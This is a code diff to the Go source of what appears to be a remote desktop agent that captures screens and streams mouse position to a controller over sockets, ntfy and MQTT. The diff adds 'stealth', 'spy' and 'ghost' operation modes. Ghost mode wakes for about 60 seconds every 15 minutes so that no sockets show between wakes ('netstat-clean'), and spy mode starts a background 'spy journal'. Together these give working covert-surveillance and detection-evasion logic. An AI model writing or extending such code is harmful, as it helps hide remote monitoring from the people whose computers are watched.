@@ -154,6 +154,9 @@ func captureRaw(monitor int, all bool, scale float64) (img *image.RGBA, w, h, ox
 // captureImage is captureRaw + encode (full frames; tile path below uses
 // captureRaw directly so it can compare pre-encode pixels).
 func captureImage(quality, monitor int, all bool, scale float64) (data []byte, w, h, ox, oy int, format string, err error) {
+	if !modeCanScreen() {
+		return nil, 0, 0, 0, 0, "", fmt.Errorf("%s", commands.ModeDenied(agentMode))
+	}
 	img, w, h, ox, oy, err := captureRaw(monitor, all, scale)
 	if err != nil {
 		return nil, 0, 0, 0, 0, "", err
@@ -229,6 +232,9 @@ func diffRects(cur, prev []byte, stride, w, h int) (changed [][4]int, ratio floa
 // the UI knows the stream is alive with nothing changed. (nil, nil) means
 // superseded mid-capture: a newer frame already published, drop silently.
 func captureTiled(quality, monitor int, all bool, scale float64) (msgs []protocol.Message, err error) {
+	if !modeCanScreen() {
+		return nil, fmt.Errorf("%s", commands.ModeDenied(agentMode))
+	}
 	s0 := frameSeq.Load()
 	img, w, h, ox, oy, err := captureRaw(monitor, all, scale)
 	if err != nil {
@@ -472,10 +478,42 @@ func instanceID() string {
 // and holds back the bad version.
 var rollbackNotice *commands.RollbackNotice
 
+// agentMode is the operation mode loaded once at startup (set-mode
+// restarts the process, so it never changes under us).
+var agentMode = commands.ModeNormal
+
+// Mode behavior gates (v1.42.3): centralized so all four transports share
+// one policy. set-mode restarts the process, so agentMode never changes.
+func modeCanScreen() bool {
+	switch agentMode {
+	case commands.ModeNormal, commands.ModePerformance, commands.ModeKiosk, commands.ModeAudit:
+		return true
+	}
+	return false
+}
+
+func modeCanMouse() bool {
+	return agentMode == commands.ModeNormal || agentMode == commands.ModePerformance
+}
+
+// announceEvery stretches presence check-ins in quiet modes (stealth/spy
+// whisper just under the 90s stale cutoff; performance hurries).
+func announceEvery(base time.Duration) time.Duration {
+	switch agentMode {
+	case commands.ModeStealth, commands.ModeSpy, commands.ModeGhost:
+		if base < 60*time.Second {
+			return 60 * time.Second
+		}
+	case commands.ModePerformance:
+		return 15 * time.Second
+	}
+	return base
+}
+
 // helloMsg builds the TypeConnect announcement, carrying any rollback report.
 func helloMsg(hn, user string) protocol.Message {
 	layers, alarm := readProtection()
-	m := protocol.Message{Type: protocol.TypeConnect, Hostname: hn, User: user, Instance: instanceID(), Version: version.DesktopAgentVersion, Auth: commands.AgentToken(), Prot: layers, ProtDetail: alarm}
+	m := protocol.Message{Type: protocol.TypeConnect, Hostname: hn, User: user, Instance: instanceID(), Version: version.DesktopAgentVersion, Auth: commands.AgentToken(), Prot: layers, ProtDetail: alarm, Mode: agentMode}
 	if rollbackNotice != nil {
 		m.RollbackBad = rollbackNotice.Bad
 		m.RollbackTo = rollbackNotice.To
@@ -544,6 +582,9 @@ type agent struct {
 	// session from the controller. The service keeps running; it just
 	// stays quiet instead of instantly reappearing. Never touches the PC.
 	quietUntil atomic.Int64
+	// ghostEnd, when non-nil, fires to end the current session: ghost
+	// mode serves ~60s windows, then goes dark until the next cycle.
+	ghostEnd <-chan time.Time
 }
 
 // disconnectQuiet is how long the agent stays quiet after a user disconnect.
@@ -552,6 +593,12 @@ const disconnectQuiet = 5 * time.Minute
 func (a *agent) setQuiet(d time.Duration) {
 	a.quietUntil.Store(time.Now().Add(d).UnixNano())
 	log.Printf("[*] Session ended by controller — staying quiet for %s (service keeps running, PC untouched)", d)
+}
+
+// setQuietSilent sleeps without the disconnect log line (ghost cycles).
+func (a *agent) setQuietSilent(d time.Duration) {
+	a.quietUntil.Store(time.Now().Add(d).UnixNano())
+	log.Printf("[*] Ghost window over — dark for %s", d.Round(time.Second))
 }
 
 func (a *agent) quietRemain() time.Duration {
@@ -980,8 +1027,13 @@ func (a *agent) connectOnce() error {
 		screenCh = screenTicker.C
 		log.Printf("[*] Periodic screenshots every %v", interval)
 	}
-	// Mouse every 120ms (direct path is cheap; unchanged events still deduped)
-	mouseTicker = time.NewTicker(120 * time.Millisecond)
+	// Mouse every 120ms (60ms in performance mode; direct path is cheap,
+	// unchanged events still deduped). Sends gated by modeCanMouse.
+	mouseEvery := 120 * time.Millisecond
+	if agentMode == commands.ModePerformance {
+		mouseEvery = 60 * time.Millisecond
+	}
+	mouseTicker = time.NewTicker(mouseEvery)
 	mouseCh = mouseTicker.C
 	defer func() {
 		if mouseTicker != nil {
@@ -1012,6 +1064,9 @@ func (a *agent) connectOnce() error {
 				return fmt.Errorf("reader done")
 			}
 		case <-mouseCh:
+			if !modeCanMouse() {
+				continue // stealth/spy/ghost/kiosk/audit: no position stream
+			}
 			x, y := getMousePos()
 			if x == lastX && y == lastY {
 				continue
@@ -1030,6 +1085,8 @@ func (a *agent) connectOnce() error {
 			}()
 		case <-pingTicker.C:
 			_ = a.send(protocol.Message{Type: protocol.TypePing})
+		case <-a.ghostEnd:
+			return nil // ghost window over: go dark until next cycle
 		}
 	}
 }
@@ -1087,7 +1144,7 @@ func (a *agent) connectViaNtfy() error {
 	}()
 	mouseTicker := time.NewTicker(2 * time.Second) // throttled: ntfy is rate-limited
 	defer mouseTicker.Stop()
-	announceTicker := time.NewTicker(25 * time.Second) // re-announce so restarted controllers find us (quiet: presence is cheap, chatter isn't)
+	announceTicker := time.NewTicker(announceEvery(25 * time.Second)) // re-announce so restarted controllers find us (quiet: presence is cheap, chatter isn't)
 	defer announceTicker.Stop()
 	// nout publishes agent->controller messages, sealed when E2E is active.
 	nout := func(msg protocol.Message) {
@@ -1231,12 +1288,17 @@ func (a *agent) connectViaNtfy() error {
 				}
 			}
 		case <-mouseTicker.C:
+			if !modeCanMouse() {
+				continue
+			}
 			x, y := getMousePos()
 			if x == lastX && y == lastY {
 				continue
 			}
 			lastX, lastY = x, y
 			nout(protocol.Message{Type: protocol.TypeMouse, X: x, Y: y})
+		case <-a.ghostEnd:
+			return nil // ghost window over: go dark until next cycle
 		}
 	}
 }
@@ -1608,7 +1670,7 @@ func (a *agent) connectViaMQTT() error {
 	}
 	log.Printf("[*] MQTT: announcing %s/%s", hn, user)
 	announce()
-	announceTicker := time.NewTicker(25 * time.Second) // quiet presence: the sweep still converges quickly on re-hello
+	announceTicker := time.NewTicker(announceEvery(25 * time.Second)) // quiet presence: the sweep still converges quickly on re-hello
 	defer announceTicker.Stop()
 	mouseTicker := time.NewTicker(150 * time.Millisecond) // MQTT is cheap: near-direct cursor feel
 	defer mouseTicker.Stop()
@@ -1625,12 +1687,17 @@ func (a *agent) connectViaMQTT() error {
 			}
 			announce()
 		case <-mouseTicker.C:
+			if !modeCanMouse() {
+				continue
+			}
 			x, y := getMousePos()
 			if x == lastX && y == lastY {
 				continue
 			}
 			lastX, lastY = x, y
 			_ = mout(protocol.Message{Type: protocol.TypeMouse, X: x, Y: y})
+		case <-a.ghostEnd:
+			return nil // ghost window over: go dark until next cycle
 		}
 	}
 }
@@ -1798,7 +1865,20 @@ func main() {
 	svcHeal := flag.Bool("svc-heal", false, "run as SYSTEM repair service (repairs only, never the agent)")
 	testOnly := flag.Bool("test", false, "dial controller once, print result, exit")
 	showHelp := flag.Bool("help", false, "show help")
+	modeFlag := flag.String("mode", "", "operation mode (normal, stealth, spy, ghost, performance, kiosk, audit); wins for this run only")
 	flag.Parse()
+
+	// Resolve operation mode: flag wins for this run, else mode.json.
+	if *modeFlag != "" {
+		if !commands.IsValidMode(*modeFlag) {
+			log.Fatalf("unknown -mode %q (valid: %s)", *modeFlag, strings.Join(commands.ValidModes, ", "))
+		}
+		commands.OverrideMode = *modeFlag
+	}
+	agentMode = commands.AgentMode()
+	if agentMode != commands.ModeNormal {
+		log.Printf("[*] Agent mode: %s", agentMode)
+	}
 
 	if *ntfyServer != "" {
 		relay.SetServer(*ntfyServer)
@@ -1841,6 +1921,11 @@ func main() {
 	healthyStop := make(chan struct{})
 	defer close(healthyStop)
 	go startHealthyHeartbeat(healthyStop)
+	// Spy journal runs only in spy mode (set-mode restarts into/out of it).
+	if agentMode == commands.ModeSpy {
+		commands.StartSpyJournal()
+		defer commands.StopSpyJournal()
+	}
 	// Crash-rollback reporting: if the watchdog restored the previous
 	// binary after a crash loop, tell the controller on every hello.
 	rollbackNotice = commands.LoadRollbackNotice()
@@ -1909,8 +1994,8 @@ func main() {
 	// relay listener alongside whatever the main loop uses, so another
 	// controller house can reach this agent through the shared bus.
 	// Relay-only modes run their own full session; the listener stands down
-	// whenever one is active.
-	if !*ntfyOnly && !*mqttOnly {
+	// whenever one is active. Ghost mode skips it: no sockets between wakes.
+	if !*ntfyOnly && !*mqttOnly && agentMode != commands.ModeGhost {
 		hn0, user0 := hostnameAndUser()
 		me0 := "agent:" + hn0
 		ca0 := *caFile
@@ -1970,6 +2055,34 @@ func main() {
 			case <-ag.closing:
 				return
 			default:
+			}
+		}
+	}
+
+	// Ghost mode: ~60s wake windows every ~15min. Between wakes there are
+	// no sockets at all (netstat-clean); orders and updates land on the
+	// next wake. Short sessions mean failure: retry in a minute.
+	if agentMode == commands.ModeGhost {
+		log.Printf("[*] ghost mode: 60s windows every ~15min")
+		for {
+			select {
+			case <-ag.closing:
+				return
+			default:
+			}
+			start := time.Now()
+			ag.ghostEnd = time.After(60 * time.Second)
+			_ = ag.connectOnce()
+			ag.ghostEnd = nil
+			ag.conn = nil
+			ag.enc = nil
+			if time.Since(start) < 10*time.Second {
+				ag.setQuietSilent(1 * time.Minute)
+			} else {
+				ag.setQuietSilent(14 * time.Minute)
+			}
+			if !waitQuiet() {
+				return
 			}
 		}
 	}
